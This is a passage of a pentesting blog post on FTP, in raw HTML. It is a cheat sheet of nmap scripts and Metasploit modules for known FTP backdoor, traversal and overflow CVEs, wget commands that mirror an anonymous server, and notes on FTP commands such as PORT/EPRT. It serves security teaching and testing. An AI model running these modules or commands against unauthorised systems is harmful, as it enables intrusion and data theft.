nmap <span class="nt">--script</span><span class="o">=</span>ftp-vsftpd-backdoor <span class="nt">-p21</span> 10.10.x.x

<span class="c">#ProFTPd 1.3.3c [OSVDB 69562]</span>
nmap <span class="nt">--script</span><span class="o">=</span>ftp-proftpd-backdoor <span class="nt">-p21</span> 10.10.x.x

<span class="c">#ProFTPD 1.3.2rc3 – 1.3.3b [CVE-2010-4221]</span>
nmap <span class="nt">--script</span><span class="o">=</span>ftp-vuln-cve2010-4221 <span class="nt">-p21</span> 10.10.x.x

<span class="c">#Titan FTP Server &lt;= 8.10.1125 – Directory Traversal [CVE-2010-2426]</span>
msf <span class="o">&gt;</span> use auxiliary/scanner/ftp/titanftp_xcrc_traversal

<span class="c">#PCMan FTP Server 2.0.7 – Directory Traversal [CVE-2015-7601]</span>
msf <span class="o">&gt;</span> use auxiliary/scanner/ftp/pcman_ftp_traversal

<span class="c">#Konica Minolta FTP Utility 1.00 – Directory Traversal [CVE-2015-7603]</span>
msf <span class="o">&gt;</span> use auxiliary/scanner/ftp/konica_ftp_traversal

<span class="c">#BisonFTP Server 3.5 – Directory Traversal [CVE-2015-7602]</span>
msf <span class="o">&gt;</span> use auxiliary/scanner/ftp/bison_ftp_traversal

<span class="c">#ColoradoFTP Server &lt;= 1.3 Build 8 – Directory Traversal [EDB-40231]</span>
msf <span class="o">&gt;</span> use auxiliary/scanner/ftp/colorado_ftp_traversal

<span class="c">#Easy File Sharing FTP Server &lt;= 3.6 – Directory Traversal [CVE-2017-6510]</span>
msf <span class="o">&gt;</span> use auxiliary/scanner/ftp/easy_file_sharing_ftp

<span class="c">#VSFTPD 2.3.4 [CVE-2011-2523]</span>
msf <span class="o">&gt;</span> use exploit/unix/ftp/vsftpd_234_backdoor

<span class="c">#ProFTPD 1.3.2rc3 – 1.3.3b [CVE-2010-4221]</span>
msf <span class="o">&gt;</span> use exploit/linux/ftp/proftp_telnet_iac

<span class="c">#ProFTPD 1.3.3c [OSVDB-69562]</span>
msf <span class="o">&gt;</span> use exploit/unix/ftp/proftpd_133c_backdoor

<span class="c">#ProFTPd 1.3.5 [CVE-2015-3306]</span>
msf <span class="o">&gt;</span> use exploit/unix/ftp/proftpd_133c_backdoor
Exploit-DB: 36742.txt

<span class="c">#Konica Minolta FTP Utility 1.00 – CWD Command Overflow (SEH) [CVE-2015-7768]</span>
Exploit-DB: 39215
msf <span class="o">&gt;</span> use exploit/windows/ftp/kmftp_utility_cwd
</pre></table></code></div></div><h3 id="download-all-files-from-ftp-server"><span class="mr-2">Download All Files From FTP Server</span><a href="#download-all-files-from-ftp-server" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>wget <span class="nt">-m</span> ftp://anonymous:anonymous@10.10.x.x <span class="c">#Donwload all</span>
wget <span class="nt">-m</span> <span class="nt">--no-passive</span> ftp://anonymous:anonymous@10.10.x.x <span class="c">#Download all</span>
</pre></table></code></div></div><h2 id="some-ftp-commands"><span class="mr-2">Some FTP Commands</span><a href="#some-ftp-commands" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><code class="language-plaintext highlighter-rouge">USER</code> username PASS password <br /> <code class="language-plaintext highlighter-rouge">HELP</code> The server indicates which commands are supported<br /> <code class="language-plaintext highlighter-rouge">PORT</code> 127,0,0,1,0,80This will indicate the FTP server to establish a connection with the IP 127.0.0.1 in port 80 (you need to put the 5th char as “0” and the 6th as the port in decimal or use the 5th and 6th to express the port in hex).<br /> <code class="language-plaintext highlighter-rouge">EPRT</code> |2|127.0.0.1|80|This will indicate the FTP server to establish a TCP connection (indicated by “2”) with the IP 127.0.0.1 in port 80. This command supports IPv6.<br /> <code class="language-plaintext highlighter-rouge">LIST</code> This will send the list of files in current folder<br /> <code class="language-plaintext highlighter-rouge">APPE</code> /path/something.txt This will indicate the FTP to store the data received from a passive connection or from a PORT/EPRT connection to a file. If the filename exists, it will append the data.<br /> <code class="language-plaintext highlighter-rouge">STOR</code> /path/something.txt Like APPE but it will overwrite the files<br /> <code class="language-plaintext highlighter-rouge">STOU</code> /path/something.txt Like APPE, but if exists it won’t do anything.<br /> <code class="language-plaintext highlighter-rouge">RETR</code> /path/to/file A passive or a port connection must be establish. Then, the FTP server will send the indicated file through that connection<br /> <code class="language-plaintext highlighter-rouge">REST</code> 6 This will indicate the server that next time it send something using RETR it should start in the 6th byte.<br /> <code class="language-plaintext highlighter-rouge">TYPE</code> i Set transfer to binary<br /> <code class="language-plaintext highlighter-rouge">PASV</code> This will open a passive connection and will indicate the user were he can connects</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/pentesting-protocols/'>pentesting protocols</a>, <a href='/categories/ftp/'>ftp</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/pentesting/" class="post-tag no-text-decoration" >pentesting</a> <a href="/tags/ftp/" class="post-tag no-text-decoration" >ftp</a> <a href="/tags/best-practicies/" class="post-tag no-text-decoration" >best practicies</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=FTP+Pentesting+Best+Practices+-+secybr+%7C+penetration+testing%2C+red+teaming+and+hack+tricks.&url=https%3A%2F%2Fsecybr.com%2Fposts%2Fftp-pentesting-best-practices%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=FTP+Pentesting+Best+Practices+-+secybr+%7C+penetration+testing%2C+red+teaming+and+hack+tricks.&u=https%3A%2F%2Fsecybr.com%2Fposts%2Fftp-pentesting-best-practices%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fsecybr.com%2Fposts%2Fftp-pentesting-best-practices%2F&text=FTP+Pentesting+Best+Practices+-+secybr+%7C+penetration+testing%2C+red+teaming+and+hack+tricks." data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/subdomain-enumeration-methods/">Subdomain Enumeration Methods</a><li><a href="/posts/shodan-tutorials-for-best-practicies/">Shodan.io Tutorials for Best Practices</a><li><a href="/posts/collecting-target-email-address/">Collecting Target Email Addresses</a><li><a href="/posts/evasion-tactics-for-scanning-targets/">Evasion Tactics For Scanning Targets (Active Scan)</a><li><a href="/posts/dumping-lsass-without-mimikatz/">Dumping LSASS Without Mimikatz</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/pentesting/">pentesting</a> <a class="post-tag" href="/tags/best-practicies/">best practicies</a> <a class="post-tag" href="/tags/red-team/">red-team</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/active-scan-evasion-tactics/">active scan evasion tactics</a> <a class="post-tag" href="/tags/asset-discovery-methods/">asset discovery methods</a> <a class="post-tag" href="/tags/asset-discovery/">asset discovery</a> <a class="post-tag" href="/tags/asset-enumeration-methods/">asset enumeration methods</a> <a class="post-tag" href="/tags/assets-of-target/">assets of target</a> <a class="post-tag" href="/tags/attack-detection-mechanism/">attack detection mechanism</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/telnet-pentesting-best-practices/"><div class="card-body"> <em class="small" data-ts="1654290000" data-df="ll" > Jun 4, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Telnet Pentesting Best Practices</h3><div class="text-muted small"><p> Telnet Telnet usually uses port 23,992 What is Telnet? Telnet is a network protocol used to virtually access a computer and to provide a two-way, collaborative and text-based communication c...</p></div></div></a></div><div class="card"> <a href="/posts/finger-pentesting-best-practices/"><div class="card-body"> <em class="small" data-ts="1654376400" data-df="ll" > Jun 5, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Finger Pentesting Best Practices</h3><div class="text-muted small"><p> Finger Finger usually uses port 79 What is Finger? Finger is a program you can use to find information about computer users. It usually lists the login name, the full name, and possibly othe...</p></div></div></a></div><div class="card"> <a href="/posts/vnc-pentesting-best-practices/"><div class="card-body"> <em class="small" data-ts="1654376400" data-df="ll" > Jun 5, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>VNC Pentesting Best Practices</h3><div class="text-muted small"><p> VNC VNC usually uses ports 5800 or 5801 or 5900 or 5901. What is VNC? It is a cross-platform screen sharing system that was created to remotely control another computer. This means that a co...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"><div class="btn btn-outline-primary disabled" prompt="Older"><p>-</p></div><a href="/posts/telnet-pentesting-best-practices/" class="btn btn-outline-primary" prompt="Newer"><p>Telnet Pentesting Best Practices</p></a></div><div id="disqus_thread" class="pt-2 pb-2"><p class="text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script type="text/javascript"> var disqus_config = function () { this.page.url = 'https://secybr.com/posts/ftp-pentesting-best-practices/'; this.page.identifier = '/posts/ftp-pentesting-best-practices/'; }; /* Lazy loading */ var disqus_observer = new IntersectionObserver(function (entries) { if(entries[0].isIntersecting) { (function () { var d = document, s = d.createElement('script'); s.src = 'https://secybr-com.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); disqus_observer.disconnect(); } }, { threshold: [0] }); disqus_observer.observe(document.querySelector('#disqus_thread')); /* Auto switch theme */ function reloadDisqus() { /* Disqus hasn't been loaded */ if (typeof DISQUS === "undefined") { return; } if (document.readyState == 'complete') { DISQUS.reset({ reload: true, config: disqus_config }); } } const modeToggle = document.querySelector(".mode-toggle"); if (typeof modeToggle !== "undefined") { /* modeToggle.addEventListener('click', reloadDisqus); // not pretty for 'color-scheme' */ window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', reloadDisqus); } </script></div></div><div class="row justify-content-center border-top"> <small class="my-4">Powered by <a href="https://twitter.com/0xhav0c" target="_blank" rel="noopener noreferrer">0xhav0c</a> © 2022 - <a href="/privacy-policy/">Privacy Policy</a> </small></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/pentesting/">pentesting</a> <a class="post-tag" href="/tags/best-practicies/">best practicies</a> <a class="post-tag" href="/tags/red-team/">red-team</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/active-scan-evasion-tactics/">active scan evasion tactics</a> <a class="post-tag" href="/tags/asset-discovery-methods/">asset discovery methods</a> <a class="post-tag" href="/tags/asset-discovery/">asset discovery</a> <a class="post-tag" href="/tags/asset-enumeration-methods/">asset enumeration methods</a> <a class="post-tag" href="/tags/assets-of-target/">assets of target</a> <a class="post-tag" href="/tags/attack-detection-mechanism/">attack detection mechanism</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-XBEEHR73W1"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-XBEEHR73W1'); }); </script>
